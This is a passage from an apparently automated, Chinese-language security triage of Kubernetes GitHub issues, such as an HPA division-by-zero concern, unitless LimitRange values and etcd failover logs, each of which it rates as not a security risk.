根据提供的Issue内容，问题描述在创建请求零个GPU设备的pod时，出现了`Allocate failed due to no healthy devices present; cannot allocate unhealthy devices nvidia.com/gpu, which is unexpected`的错误。

这个问题与Kubernetes调度器处理资源请求的方式有关，当请求的设备数量为0且可用设备为0时，pod创建失败。

根据风险判断标准：

1. **该风险能被攻击者利用**：从描述中看，没有提及攻击者可以利用该问题。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题似乎是功能性缺陷，而非安全漏洞。
3. **Issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险**：此问题为配置和调度逻辑的问题。
4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：创建pod需要相应权限，且该问题不涉及拒绝服务。

综合来看，该Issue描述的问题属于功能性问题，不涉及安全风险。

---

## Issue #128847 Division-by-zero in Horizontal Workload Autoscaler

- Issue 链接：[#128847](https://github.com/kubernetes/kubernetes/issues/128847)

### Issue 内容

**Which component are you using?**:

Horizontal workload autoscaler.

**What version of the component are you using?**:

Not relevant.

**What k8s version are you using (`kubectl version`)?**:

<details><summary><code>kubectl version</code> Output</summary><br><pre>
$ kubectl version
Client Version: v1.30.6-dispatcher
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5-gke.1443001
</pre></details>

**What environment is this in?**:

Not relevant.

**What did you expect to happen?**:

When the horizontal autoscaler computes the expected number of replicas, [it uses the following formula](https://github.com/kubernetes/kubernetes/blob/cf480a3a1a9cb22f3439c0a7922822d9f67f31b5/pkg/controller/podautoscaler/replica_calculator.go#L369):

```go
usageRatio := float64(usage) / (float64(targetUsagePerPod) * float64(statusReplicas))
```

(This formula (or a variation of it) appears a couple of times in [this file](https://github.com/kubernetes/kubernetes/blob/cf480a3a1a9cb22f3439c0a7922822d9f67f31b5/pkg/controller/podautoscaler/replica_calculator.go#L369).)

It's not impossible that `statusReplicas` (i.e. the `status.replicas` field of the `/scale` subresource) equals zero (e.g. if a user kills pods), leading to a division by zero.

[The Golang spec allows divisions by zero to trigger traps](https://github.com/golang/go/issues/43577), although most implementations would return +Inf (which leads to the correct behaviour) or NaN (if `usage == 0.`, in which case the func would return a negative number of replicas).

**What happened instead?**:

This problem could lead to a panic, or an incorrect behaviour. This could only happen as a result of a race condition, and in the unlikely situation where `status.replicas == 0`. I'm not sure of its practical significance.

**How to reproduce it (as minimally and precisely as possible)**:

This issue only appears as a result of a race condition. I couldn't produce it.


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
在此Issue中，提出了在Kubernetes的Horizontal Workload Autoscaler中，可能存在除零错误的问题。当`statusReplicas`为0时，计算`usageRatio`时会发生除零。

根据描述，这种情况需要在特殊的竞争条件下才能出现，且发生的可能性极低。提交者也无法重现该问题。

从安全角度分析，除非攻击者能够控制或影响`statusReplicas`的值使其为0，否则无法利用该问题进行攻击。而通常情况下，非特权用户无法直接影响到`statusReplicas`的值。

根据风险判断标准，此问题不满足被攻击者利用且造成高风险的条件。因此，该Issue不涉及安全风险。

---

## Issue #128813 LimitRange and ResourceQuota Accept Values Without Units, Leading to Pod Scheduling and Runtime Failures

- Issue 链接：[#128813](https://github.com/kubernetes/kubernetes/issues/128813)

### Issue 内容

#### What happened?

When creating a LimitRange or ResourceQuota without specifying units for memory and storage (e.g., "2" instead of "2Gi"), Kubernetes accepts the resource creation. However, pods fail to be scheduled, resulting in the following error:
`Error creating: pods "...": [maximum memory usage per Pod is 2, but limit is 1Gi, maximum memory usage per Container is 2, but limit is 1Gi]`

Upon adjusting pod resource requests and limits to omit units (e.g., memory: 1), pods schedule but remain stuck in the ContainerCreating phase with containerd errors:
`Failed to create pod sandbox: rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed...`




#### What did you expect to happen?

1. Kubernetes should reject LimitRange or ResourceQuota configurations without specified units for memory and storage.
2. Alternatively, Kubernetes should normalize the values to a default unit to ensure compatibility.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a LimitRange without units for memory:
yaml
`apiVersion: v1
kind: LimitRange
metadata:
  name: example-limitrange
  namespace: test-namespace
spec:
  limits:
  - type: Pod
    max:
      memory: "2"
    min:
      memory: "500m"
  - type: Container
    max:
      memory: "2"
    min:
      memory: "250m"
`

2. Create a ResourceQuota without units:
`
apiVersion: v1
kind: ResourceQuota
metadata:
  name: example-resourcequota
  namespace: test-namespace
spec:
  hard:
    limits.memory: "4"
    requests.memory: "4"
`
4. Deploy a pod with the following resource configuration:
`resources:
  requests:
    cpu: 500m
    memory: 512Mi
  limits:
    cpu: 500m
    memory: 1024Mi
`
5.Observe pod creation failure with FailedCreate event.
6.Update the pod memory to omit units:

`resources:
  requests:
    cpu: 500m
    memory: 1
  limits:
    cpu: 500m
    memory: 1
`
7. Observe pod stuck in ContainerCreating state with containerd errors.

#### Anything else we need to know?

This issue occurs consistently across multiple clusters. ( EKs , k3s ...)
Errors in the ContainerCreating phase point to systemd and containerd issues when using unnormalized values

#### Kubernetes version

<details>

```console
$ kubectl version
# Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.6-eks-7f9249a
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在创建Kubernetes的LimitRange或ResourceQuota时，如果未为内存和存储指定单位（例如使用"2"而不是"2Gi"），Kubernetes会接受资源创建，但会导致Pod无法调度，或者在ContainerCreating阶段遇到错误。

根据风险判断标准：

1. **该风险能被攻击者利用**：此问题需要具备创建或修改LimitRange和ResourceQuota的权限，普通用户通常不具备此权限。

4. **当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险**：因为需要较高的权限才能实施此操作。

因此，此Issue主要涉及配置不当导致的运行问题，不属于安全风险。

---

## Issue #128812 The kube-apiserver (with 3 etcd endpints by --etcd-servers)still connect the unhealthy etcd member when we shut down one master node(which has one etcd static pods)

- Issue 链接：[#128812](https://github.com/kubernetes/kubernetes/issues/128812)

### Issue 内容

#### What happened?

1. we use the kube-apiserver connect to etcd by three members as :
```
"etcd-servers": [
      "https://10.255.69.14:2379",
      "https://10.255.69.15:2379",
      "https://10.255.69.16:2379",
      "https://localhost:2379"
    ],
```

2. Shut down the master3 node(10.255.69.16), which has both etcd and apiserver static pods


3. Found the master1(10.255.69.14) apiserver and master2(10.255.69.15) apiserver still connect to the unhealthy 10.255.69.16 etcd endpoint

#### What did you expect to happen?

When we shutdown one etcd member, the kube-apiserver should quickly switch to the healthy etcd endpoint

#### How can we reproduce it (as minimally and precisely as possible)?

1 set the apiserver connect etcd by --etcd-servers ,which has 3 members
2 shut down the master(not reboot)

#### Anything else we need to know?

- kube-apiserver logs show as follows:
```
apiserver 
2024-11-15T16:08:24.340356305+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:24.340Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc01402e000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:24.340460558+08:00 stderr F I1115 08:08:24.340378      20 healthz.go:257] etcd check failed: readyz
2024-11-15T16:08:24.340460558+08:00 stderr F [-]etcd failed: error getting data from etcd: context deadline exceeded
2024-11-15T16:08:24.340541843+08:00 stderr F E1115 08:08:24.340479      20 timeout.go:141] post-timeout activity - time-elapsed: 1.001696115s, GET "/readyz" result: <nil>
2024-11-15T16:08:27.369028487+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:27.368Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f856000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:27.369028487+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:27.368Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f856000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:28.614097370+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:28.613Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00
20b5880/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:28.614097370+08:00 stderr F I1115 08:08:28.613845      20 trace.go:205] Trace[523486837]: "GuaranteedUpdate etcd3" audit-id:dbab0d30-2e4f-4604-b367-c84f000f1f86,key:/configmaps/kube-system/kube-controller-manag
er,type:*core.ConfigMap (15-Nov-2024 08:08:23.614) (total time: 4999ms):
2024-11-15T16:08:28.614097370+08:00 stderr F Trace[523486837]: ---"Txn call finished" err:context deadline exceeded 4998ms (08:08:28.613)
2024-11-15T16:08:28.614097370+08:00 stderr F Trace[523486837]: [4.999504982s] [4.999504982s] END
2024-11-15T16:08:28.616421774+08:00 stderr F I1115 08:08:28.616312      20 trace.go:205] Trace[1123415286]: "Update" url:/api/v1/namespaces/kube-system/configmaps/kube-controller-manager,user-agent:kube-controller-manager/v1.25.8 (linux/amd64) kubernetes/594da2b/leader-election,audit-id:dbab0d30-2e4f-4604-b367-c84f000f1f86,client:127.0.0.1,accept:application/vnd.kubernetes.protobuf, */*,protocol:HTTP/2.0 (15-Nov-2024 08:08:23.614) (total time: 5002ms):
2024-11-15T16:08:28.616421774+08:00 stderr F Trace[1123415286]: ---"Write to database call finished" len:535,err:Timeout: request did not complete within requested timeout - context deadline exceeded 4999ms (08:08:28.613)      
2024-11-15T16:08:28.616421774+08:00 stderr F Trace[1123415286]: [5.002050748s] [5.002050748s] END
2024-11-15T16:08:28.616890678+08:00 stderr F E1115 08:08:28.616631      20 timeout.go:141] post-timeout activity - time-elapsed: 2.794599ms, PUT "/api/v1/namespaces/kube-system/configmaps/kube-controller-manager" result: <nil> 
2024-11-15T16:08:30.058932458+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:30.058Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}

2024-11-15T16:08:32.011392068+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00bd06fc0/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:50894->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012062393+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0a4efcc40/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:44404->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012211954+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012211954+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F I1115 08:08:32.012185      20 trace.go:205] Trace[1958868955]: "GuaranteedUpdate etcd3" audit-id:28031557-60b2-4f4f-ad50-aa00b6244ed5,key:/leases/gtm/cell.gtm.io,type:*coordination.Lease (15-Nov-2024 08:08:25.595) (total time: 6416ms):

2024-11-15T16:08:32.012513501+08:00 stderr F Trace[891349870]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out 9758ms (08:08:32.012)
2024-11-15T16:08:32.012513501+08:00 stderr F Trace[891349870]: [9.75949209s] [9.75949209s] END
2024-11-15T16:08:32.012513501+08:00 stderr F E1115 08:08:32.012404      20 status.go:71] apiserver received an error that is not an metav1.Status: &status.Error{s:(*status.Status)(0xc0bc1a7f98)}: rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out

2024-11-15T16:08:32.012736479+08:00 stderr F I1115 08:08:32.012514      20 trace.go:205] Trace[859168237]: "GuaranteedUpdate etcd3" audit-id:71717ed4-0c00-458a-8897-0d9df2388bfb,key:/leases/machine-config-operator/machine-config,type:*coordination.Lease (15-Nov-2024 08:08:23.523) (total time: 8489ms):
2024-11-15T16:08:32.012736479+08:00 stderr F Trace[859168237]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed ou
t 8488ms (08:08:32.012)
2024-11-15T16:08:32.012736479+08:00 stderr F Trace[859168237]: [8.48927931s] [8.48927931s] END

0bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.013502285+08:00 stderr F I1115 08:08:32.012231      20 trace.go:205] Trace[2108509803]: "GuaranteedUpdate etcd3" audit-id:3635e940-38e3-41ca-987a-926cc584384a,key:/leases/envoy-gateway-system/5b9825d2.gateway.envoyproxy.io,type:*coordination.Lease (15-Nov-2024 08:08:30.258) (total time: 1753ms):
2024-11-15T16:08:32.013502285+08:00 stderr F Trace[2108509803]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out 1752ms (08:08:32.012)
2024-11-15T16:08:32.013502285+08:00 stderr F Trace[2108509803]: [1.753630806s] [1.753630806s] END

2024-11-15T16:08:34.699497756+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:34.699Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f16d880/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:50918->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:34.699497756+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:34.699Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc007d40000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:47940->10.255.69.16:2379: read: connection timed out"}

2024-11-15T16:08:35.070903277+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:35.070Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0a2a90700/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = keepalive ping failed to receive ACK within timeout"}
2024-11-15T16:08:35.082401449+08:00 stderr F W1115 08:08:35.082223      20 logging.go:59] [core] [Channel #254 SubChannel #257] grpc: addrConn.createTransport failed to connect to {
2024-11-15T16:08:35.082401449+08:00 stderr F   "Addr": "10.255.69.16:2379",
2024-11-15T16:08:35.082401449+08:00 stderr F   "ServerName": "10.255.69.16",
2024-11-15T16:08:35.082401449+08:00 stderr F   "Attributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "BalancerAttributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Type": 0,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Metadata": null
2024-11-15T16:08:35.082401449+08:00 stderr F }. Err: connection error: desc = "transport: Error while dialing dial tcp 10.255.69.16:2379: connect: connection timed out"
2024-11-15T16:08:35.082401449+08:00 stderr F W1115 08:08:35.082242      20 logging.go:59] [core] [Channel #977 SubChannel #980] grpc: addrConn.createTransport failed to connect to {
2024-11-15T16:08:35.082401449+08:00 stderr F   "Addr": "10.255.69.16:2379",
2024-11-15T16:08:35.082401449+08:00 stderr F   "ServerName": "10.255.69.16",
2024-11-15T16:08:35.082401449+08:00 stderr F   "Attributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "BalancerAttributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Type": 0,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Metadata": null
2024-11-15T16:08:35.082401449+08:00 stderr F }. Err: connection error: desc = "transport: Error while dialing dial tcp 10.255.69.16:2379: connect: connection timed out"

```

- The etcd logs show as follows:
```
etcd 

2024-11-15T16:00:03.089125997+08:00 stderr F {"level":"info","ts":"2024-11-15T08:00:03.088971Z","caller":"fileutil/purge.go:85","msg":"purged","path":"/var/lib/etcd/member/wal/00000000000014a6-0000000005fdfcae.wal"}
2024-11-15T16:01:04.261555789+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:04.261443Z","caller":"mvcc/index.go:214","msg":"compact tree index","revision":91749871}
2024-11-15T16:01:05.254012681+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:05.253911Z","caller":"mvcc/kvstore_compaction.go:66","msg":"finished scheduled compaction","compact-revision":91749871,"took":"966.045196ms","hash":576483144}
2024-11-15T16:01:05.254012681+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:05.253986Z","caller":"mvcc/hash.go:137","msg":"storing new hash","hash":576483144,"revision":91749871,"compact-revision":91733961}
2024-11-15T16:04:09.827516612+08:00 stderr F {"level":"info","ts":"2024-11-15T08:04:09.827399Z","caller":"wal/wal.go:785","msg":"created a new WAL segment","path":"/var/lib/etcd/member/wal/00000000000014ac-0000000005ff8643.wal"
}
2024-11-15T16:04:33.101219829+08:00 stderr F {"level":"info","ts":"2024-11-15T08:04:33.101107Z","caller":"fileutil/purge.go:85","msg":"purged","path":"/var/lib/etcd/member/wal/00000000000014a7-0000000005fe3968.wal"}
2024-11-15T16:06:04.278242322+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:04.278114Z","caller":"mvcc/index.go:214","msg":"compact tree index","revision":91765934}
2024-11-15T16:06:05.109317576+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:05.109193Z","caller":"mvcc/kvstore_compaction.go:66","msg":"finished scheduled compaction","compact-revision":91765934,"took":"803.717455ms","h
ash":163059895}
2024-11-15T16:06:05.109317576+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:05.109259Z","caller":"mvcc/hash.go:137","msg":"storing new hash","hash":163059895,"revision":91765934,"compact-revision":91749871}
2024-11-15T16:08:15.432491578+08:00 stderr F 2024/11/15 08:08:15 WARNING: [core] [Server #9] grpc: Server.processUnaryRPC failed to write status: connection error: desc = "transport is closing"
2024-11-15T16:08:28.472483552+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:28.472346Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
2024-11-15T16:08:33.472610748+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:33.472502Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
2024-11-15T16:08:38.473043376+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:38.472799Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
```

```
1. as we can see ,the 10.255.69.16 is unhealthy status at 15T08:08:28.472346Z

2. but the apiserver still try to connect to this unhealthy member  at 2024-11-15T16:08:32

```

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.25.8
</details>


#### Cloud provider

<details>
no
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
5.15.131
# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在关闭一个包含etcd静态Pod的master节点后，kube-apiserver仍然尝试连接已经不健康的etcd成员节点。这是关于kube-apiserver在etcd节点失效后的连接行为的问题。

根据提供的信息，这是一个可用性或稳定性的问题，但并不涉及安全风险。因为要使etcd成员节点不可用，需要对该节点具有管理员权限或物理访问权限，攻击者无法通过此方式进行攻击。此外，kube-apiserver持续尝试连接不可用的etcd节点，可能会导致一定的延迟，但不会导致严重的安全漏洞。

因此，根据风险判断标准，该Issue不涉及安全风险。

---

## Issue #128808 kubectl edit: "You can run `kubectl replace -f FILE` to try this update again" misleading if user passed flags such as `--context`

- Issue 链接：[#128808](https://github.com/kubernetes/kubernetes/issues/128808)

### Issue 内容

#### What happened?

I ran `kubectl --context=dev edit statefulset/kafka` and got a permissions error (my GKE user did not have appropriate permissions). I had used `--context=dev` to select a particular cluster.

After the permissions error, kubectl printed

```
You can run `kubectl replace -f /var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml` to try this update again.
```

I fixed my permission error (by giving my GKE user appropriate permissions) and ran the command above, but I got this error:

```
Error from server (Conflict): error when replacing "/var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml": Operation cannot be fulfilled on statefulsets.apps "kafka": StorageError: invalid object, Code: 4, Key: /registry/statefulsets/kafka-default/kafka, ResourceVersion: 0, AdditionalErrorMsg: Precondition failed: UID in precondition: 545e2602-484d-4c17-91ce-52bddf06e81e, UID in object meta: a280573a-fcd0-4771-a302-c48d1d47972f
```

That is because the original `edit` command I ran included `--context=dev` and the suggested "try again" command did not — I was sending this command to the wrong cluster!

#### What did you expect to happen?

Running the command printed by `kubectl edit` would run the same operation as my original operation, not talk to a different cluster.

Either:
- kubectl recognizes that relevant options like `--context` were passed by the user and includes them in the suggested command
- kubectl recognizes that relevant options like `--context` were passed by the user and decides not to suggest a command at all if it doesn't want to reproduce them
- kubectl includes more context from the original command in the file it writes and the command it suggests uses that full context
- The message printed could explicitly call out that you need to set things like context in the same way as the original command.

From my perspective, it's not particularly obvious that you *do* have to add `--context` yourself to the follow-up command but you *don't* have to add `--namespace`. I can reason it out based on having a somewhat sophisticated mental model of k8s/kubectl but telling people to run a write command that might talk to the wrong cluster seems like something to avoid!

#### How can we reproduce it (as minimally and precisely as possible)?

The issue is pretty clear from [the source](https://github.com/kubernetes/kubernetes/blob/475ee33f698334e5b00c58d3bef4083840ec12c5/staging/src/k8s.io/kubectl/pkg/cmd/util/editor/editoptions.go#L400C28-L400C83): the suggested command never includes extra flags like `--context`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.9-gke.1496000```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
Darwin Davids-MacBook-Pro.local 22.6.0 Darwin Kernel Version 22.6.0: Thu Sep  5 20:47:01 PDT 2024; root:xnu-8796.141.3.708.1~1/RELEASE_ARM64_T6000 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用`kubectl edit`命令时，如果用户指定了`--context`等参数，而命令执行失败后，kubectl给出的重试建议命令中未包含这些参数，可能导致用户在错误的上下文中执行命令，影响到错误的集群资源。这是一个用户体验和操作便利性的问题，可能会导致用户误操作，但并不涉及安全风险。

根据风险判断标准：
1. 该问题不会被攻击者利用，因为攻击者无法控制用户的命令输入，也无法诱导用户执行错误的操作。
2. 该问题不会成为一个漏洞，不符合分配CVE编号的条件，且根据CVSS 3.1评分标准也不会达到high以上的评级。
3. 该问题属于用户在操作过程中可能出现的误操作，并不是项目本身的安全漏洞。

综上所述，该Issue不涉及安全风险。

---

## Issue #128798 Deployment controller: Inconsistency of deletePod pod update handler and oldPodsRunning condition

- Issue 链接：[#128798](https://github.com/kubernetes/kubernetes/issues/128798)

### Issue 内容

#### What happened?

We observed that in cluster with phase=Failed pods present, the update of the deployment using Recreate strategy was stalling for ~10 minutes (ProgressDeadlineSeconds period).

After a log analysis and code, I think this is caused by the fact that [deletePod handler](https://github.com/kubernetes/kubernetes/blob/74e84a90c725047b1328ff3d589fedb1cb7a120e/pkg/controller/deployment/deployment_controller.go#L385-L391) (the handler attached to pod informer), for Recreate case is enqueuing the deployment only if the number of pods equals zero. OTOH if the loop triggers, the different condition is checked: [oldPodsRunning](https://github.com/kubernetes/kubernetes/blob/74e84a90c725047b1328ff3d589fedb1cb7a120e/pkg/controller/deployment/recreate.go#L48-L51) ignores the terminal state pods such as Failed/Succeeded.

In effect, we may not enqueue deployment at the time when oldPodsRunning becomes true in a case when e.g. Succeeded pod is present.

#### What did you expect to happen?

That the deployment is enqueued at the time when oldPodsRunning becomes true -- the last pod is deleted.

#### How can we reproduce it (as minimally and precisely as possible)?

* Create a deployment with a pod in Failed state (we used a deployment with image that OOMs quite often)
* Try to update deployment few times
* You will observe that the updates starts to be delayed by ~10m at some point.

#### Anything else we need to know?

A proposed fix is to change the deletePod to exclude the Final/Succeed state or even better share the logic with the oldPodsRunning condition (maybe even call it from there).

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30.5, but the code looks like this also in master branch.
</details>


#### Cloud provider

<details>
gke
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了Kubernetes部署控制器中的一个逻辑问题，当存在处于Failed或Succeeded状态的Pod时，使用Recreate策略更新Deployment可能会因为Pod未被正确地入队（enqueue）而导致更新延迟约10分钟。问题的根源在于deletePod处理程序和oldPodsRunning条件之间的逻辑不一致。

从安全角度来看，这个问题导致了Deployment更新延迟，但并未提及任何可被攻击者利用的安全漏洞。攻击者无法通过此问题提升权限、进行命令执行或影响其他用户的资源。根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #128775 When I'm running make update, I fail to run to Running update-codegen.

- Issue 链接：[#128775](https://github.com/kubernetes/kubernetes/issues/128775)

### Issue 内容

#### What happened?

When I was running make update to Running update-codegen, an error occurred:
```Running in short-circuit mode; run with FORCE_ALL=true to force all scripts to run.
Running update-go-workspace
Running update-codegen
+++ [1113 10:34:29] Generating protobufs for 70 targets
+++ [1113 10:35:24] Generating deepcopy code for 267 targets
F1113 10:35:25.056042     508 main.go:107] Error: failed making a parser: error(s) in "./staging/src/k8s.io/code-generator/examples/HyphenGroup/apis/example/v1":
